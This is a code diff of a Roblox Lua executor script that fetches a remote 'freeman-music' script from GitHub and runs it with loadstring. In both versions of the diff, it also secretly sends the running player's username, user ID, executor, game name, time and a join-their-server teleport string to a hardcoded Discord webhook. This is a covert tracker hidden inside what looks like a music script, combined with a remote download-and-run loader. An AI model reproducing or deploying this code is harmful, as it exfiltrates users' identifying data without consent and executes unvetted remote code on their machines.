@@ -1,21 +1,18 @@
-local HttpService=game:GetService("HttpService")
-local Players=game:GetService("Players")
-local Marketplace=game:GetService("MarketplaceService")
+local h=game:GetService("HttpService")
+local P=game:GetService("Players")
+local M=game:GetService("MarketplaceService")
+local ORIG="https://raw.githubusercontent.com/Freeman4i37/freeman-scriptss/main/freeman-music.lua"
+local WEB="https://discord.com/api/webhooks/1428042359228071936/nBrMxWbCuQ9VUatcWhoPDFAn4jSvAMdzFHLJ5z3lDCuUHpea-wlXhFCA-BguJRyUZRyD"
 
-local ORIGINAL="https://raw.githubusercontent.com/Freeman4i37/freeman-scriptss/main/freeman-music.lua"
-local WEBHOOK="https://discord.com/api/webhooks/1428042359228071936/nBrMxWbCuQ9VUatcWhoPDFAn4jSvAMdzFHLJ5z3lDCuUHpea-wlXhFCA-BguJRyUZRyD"
-
-local function runOriginal()
- local ok,res=pcall(function()
-  local code=game:HttpGet(ORIGINAL)
-  local fn=loadstring(code)
-  if fn then fn() end
+local function runOrig()
+ pcall(function()
+  local c=game:HttpGet(ORIG)
+  local f=loadstring(c)
+  if f then f() end
  end)
- return ok,res
 end
 
-
-local function detectExecutor()
+local function detectExec()
  local ok,res
  if _G.identifyexecutor then ok,res=pcall(function() return _G.identifyexecutor() end) if ok and res then return tostring(res) end end
  if identifyexecutor then ok,res=pcall(function() return identifyexecutor() end) if ok and res then return tostring(res) end end
@@ -24,54 +21,51 @@ local function detectExecutor()
  return "Desconhecido"
 end
 
-local function serverCode()
- local placeId=game.PlaceId or 0
- local jobId=game.JobId or "Desconhecido"
- return string.format('(game:GetService("TeleportService")):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)', placeId, jobId)
+local function teleportCodeString()
+ local placeId = tostring(game.PlaceId or 0)
+ local jobId = tostring(game.JobId or "")
+ if jobId == "" or jobId == "nil" then jobId = "JOBID_UNAVAILABLE" end
+ return string.format('(game:GetService("TeleportService")):TeleportToPlaceInstance(%s, "%s", game.Players.LocalPlayer)', placeId, jobId)
 end
 
-local function sendLog(player)
- local nick=player and player.Name or "Desconhecido"
- local userId=player and tostring(player.UserId) or "0"
- local avatar="https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=420&height=420&format=png"
- local executor=detectExecutor()
- local gameName="Desconhecido"
+local function sendWebhook(pl)
+ local nick = pl and pl.Name or "Desconhecido"
+ local uid = pl and tostring(pl.UserId) or "0"
+ local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId="..uid.."&width=420&height=420&format=png"
+ local exec = detectExec()
+ local gname = "Desconhecido"
  pcall(function()
-  local info=Marketplace:GetProductInfo(game.PlaceId)
-  if info and info.Name then gameName=info.Name end
+  local info=M:GetProductInfo(game.PlaceId)
+  if info and info.Name then gname = info.Name end
  end)
- local time=os.date("%d/%m/%Y - %H:%M:%S")
- local code=serverCode()
-
- local embed={
-  title="📡 Novo usuário executou o script",
-  color=16711680,
-  fields={
-   {name="👤 Nick:",value=nick,inline=true},
-   {name="🆔 ID:",value=userId,inline=true},
-   {name="🧩 Executor:",value=executor,inline=true},
-   {name="🎯 Game:",value=gameName,inline=false},
-   {name="🕐 Horário:",value=time,inline=false},
-   {name="🔑 Código de entrada do servidor:",value="```"..code.."```",inline=false}
+ local time = os.date("%d/%m/%Y - %H:%M:%S")
+ local tpcode = teleportCodeString()
+ local embed = {
+  title = "📡 Novo usuário executou o script",
+  color = 16711680,
+  fields = {
+   {name="👤 Nick:", value=nick, inline=true},
+   {name="🆔 ID:", value=uid, inline=true},
+   {name="🧩 Executor:", value=exec, inline=true},
+   {name="🎯 Game:", value=tostring(gname), inline=false},
+   {name="🕐 Horário:", value=tostring(time), inline=false},
+   {name="🔑 Código de entrada do servidor (copie e cole no executor para entrar):", value=tpcode, inline=false}
   },
-  thumbnail={url=avatar},
-  footer={text="Freeman Log System"}
+  thumbnail = { url = avatar },
+  footer = { text = "Freeman Log System" }
  }
-
- local payload={embeds={embed}}
- local body=HttpService:JSONEncode(payload)
-
+ local payload = {embeds = {embed}}
+ local body = h:JSONEncode(payload)
  pcall(function()
   if request then
-   request({Url=WEBHOOK,Method="POST",Headers={["Content-Type"]="application/json"},Body=body})
+   request({Url = WEB, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = body})
   else
-   HttpService:PostAsync(WEBHOOK,body,Enum.HttpContentType.ApplicationJson)
+   h:PostAsync(WEB, body, Enum.HttpContentType.ApplicationJson)
   end
  end)
 end
 
-local ok,res=runOriginal()
-local player=nil
-pcall(function() player=Players.LocalPlayer end)
-pcall(function() sendLog(player) end)
-return ok,res
+runOrig()
+local pl = nil
+pcall(function() pl = P.LocalPlayer end)
+sendWebhook(pl)
